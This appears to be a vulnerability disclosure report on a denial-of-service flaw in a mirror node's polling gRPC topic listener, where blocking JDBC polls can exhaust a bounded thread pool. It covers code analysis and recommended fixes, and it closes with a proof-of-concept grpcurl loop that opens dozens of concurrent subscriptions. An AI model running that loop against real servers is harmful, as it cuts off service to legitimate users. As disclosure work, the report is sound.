### Title
Unbounded Concurrent Subscriptions Exhaust `Schedulers.boundedElastic()` Thread Pool in `PollingTopicListener` (DoS)

### Summary
`PollingTopicListener.listen()` schedules a blocking JDBC poll on a single shared `Schedulers.boundedElastic()` instance for every subscriber, with no global subscriber cap. The only server-side limit (`maxConcurrentCallsPerConnection = 5`) is per-TCP-connection, not global. An unprivileged attacker opening enough parallel TCP connections can saturate the bounded thread pool, making the mirror node unresponsive to all gRPC topic subscribers.

### Finding Description

**Exact code path:**

`PollingTopicListener.java` line 31 allocates one shared scheduler:
```java
private final Scheduler scheduler = Schedulers.boundedElastic();
```
`Schedulers.boundedElastic()` caps threads at `10 × availableProcessors` (e.g. 40 threads on a 4-core host).

`listen()` (lines 38–43) attaches every subscription to that scheduler:
```java
return Flux.defer(() -> poll(context))
    .delaySubscription(interval, scheduler)
    .repeatWhen(RepeatSpec.times(Long.MAX_VALUE)
        .withFixedDelay(interval)
        .withScheduler(scheduler))
```
`withScheduler(scheduler)` causes the repeat signal—and therefore the next `poll()` invocation—to be delivered on a `boundedElastic` worker thread.

`poll()` (lines 51–61) executes a **synchronous, blocking** JPA call:
```java
return Flux.fromStream(topicMessageRepository.findByFilter(newFilter));
```
`TopicMessageRepositoryCustomImpl.findByFilter()` line 60:
```java
return typedQuery.getResultList().stream(); // blocking JDBC
```
Each active subscription holds a `boundedElastic` thread for the full duration of every DB round-trip (every 500 ms by default).

**No global subscriber cap exists.** `TopicMessageServiceImpl` line 48 tracks `subscriberCount` only as a Micrometer gauge—no enforcement:
```java
private final AtomicLong subscriberCount = new AtomicLong(0L);
```

**The only limit** is `NettyProperties` line 14:
```java
private int maxConcurrentCallsPerConnection = 5;
```
This is a **per-connection** limit set in `GrpcConfiguration` line 33:
```java
serverBuilder.maxConcurrentCallsPerConnection(nettyProperties.getMaxConcurrentCallsPerConnection());
```
It does not bound the total number of connections or total subscriptions across connections.

**Root cause:** Blocking I/O dispatched onto a bounded thread pool, combined with no global subscriber limit and a per-connection cap that is trivially bypassed by opening multiple connections.

### Impact Explanation

On a 4-core host the thread cap is 40. An attacker opens 9 TCP connections × 5 subscriptions = 45 concurrent `listen()` calls. All 40 `boundedElastic` threads are occupied waiting on JDBC. Every subsequent poll for every legitimate subscriber queues behind the attacker's tasks. Because `RepeatSpec.times(Long.MAX_VALUE)` keeps each subscription alive indefinitely, the starvation is permanent until the attacker disconnects. The mirror node stops delivering topic messages to all clients, constituting a complete availability failure for the gRPC consensus service.

### Likelihood Explanation

No authentication or rate-limiting is required. Any network-reachable client can open arbitrary TCP connections to the gRPC port. The number of connections needed to trigger exhaustion is small (single digits on typical deployments). The attack is trivially scriptable with any gRPC client library and is fully repeatable. The only precondition is that the operator has configured `hiero.mirror.grpc.listener.type=POLL`; the default is `REDIS`, but `POLL` is a documented and supported mode.

### Recommendation

1. **Enforce a global subscriber cap** in `TopicMessageServiceImpl.subscribeTopic()`: reject new subscriptions when `subscriberCount` exceeds a configurable maximum, returning `RESOURCE_EXHAUSTED` to the caller.
2. **Remove blocking I/O from `boundedElastic`**: wrap `topicMessageRepository.findByFilter()` with `Flux.fromStream(...).subscribeOn(Schedulers.boundedElastic())` using a dedicated, separately-capped scheduler, or migrate to a non-blocking R2DBC repository so no thread is held during the query.
3. **Add a per-IP or per-client connection limit** at the Netty layer in addition to the per-connection call limit.
4. **Add `maxConnectionAge`** on the `NettyServerBuilder` to recycle long-lived attacker connections.

### Proof of Concept

**Precondition:** Mirror node running with `hiero.mirror.grpc.listener.type=POLL`.

**Steps:**

```
# Determine thread cap (e.g. 4-core host → 40 threads)
# Open 9 connections, each with 5 concurrent subscribeTopic streams (45 total)

for i in $(seq 1 9); do
  grpcurl -plaintext -d '{"topicID":{"topicNum":1},"consensusStartTime":{"seconds":0}}' \
    -H "grpc-timeout: 9999S" \
    <mirror-node>:5600 \
    com.hedera.mirror.api.proto.ConsensusService/subscribeTopic &
  grpcurl -plaintext -d '{"topicID":{"topicNum":2},"consensusStartTime":{"seconds":0}}' \
    -H "grpc-timeout: 9999S" \
    <mirror-node>:5600 \
    com.hedera.mirror.api.proto.ConsensusService/subscribeTopic &
  # ... repeat to reach 5 per connection
done

# Now attempt a legitimate subscription:
grpcurl -plaintext -d '{"topicID":{"topicNum":99},"consensusStartTime":{"seconds":0}}' \
  <mirror-node>:5600 \
  com.hedera.mirror.api.proto.ConsensusService/subscribeTopic
# Result: hangs indefinitely / no messages delivered — thread pool exhausted
```

**Expected result:** The legitimate subscription receives no data and the server log shows `boundedElastic` task queue growing without bound, confirming thread starvation.
